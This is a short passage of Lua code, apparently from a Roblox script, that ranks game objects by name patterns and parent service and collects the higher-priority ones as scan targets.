                    local isKnown = false
                    for _, kn in ipairs(KNOWN_NAMES) do
                        if kn:lower() == n then isKnown=true break end
                    end
                    local isNumeric    = obj.Name:match("%d") ~= nil
                    local isHiddenSvc  = obj.Parent and (obj.Parent.Name=="JointsService" or obj.Parent.Name=="SoundService")
                    local isShortRand  = #obj.Name <= 4 and obj.Name:match("%a") and obj.Name:match("%d")
                    local priority = (isKnown or isHiddenSvc or isShortRand) and "HIGH"
                              or isNumeric and "MED" or "LOW"
                    
                    if scanMode == "AGGRESSIVE" or priority ~= "LOW" then
                        table.insert(targets, {obj=obj, priority=priority})
                    end
                end
            end
        end)
    end
    
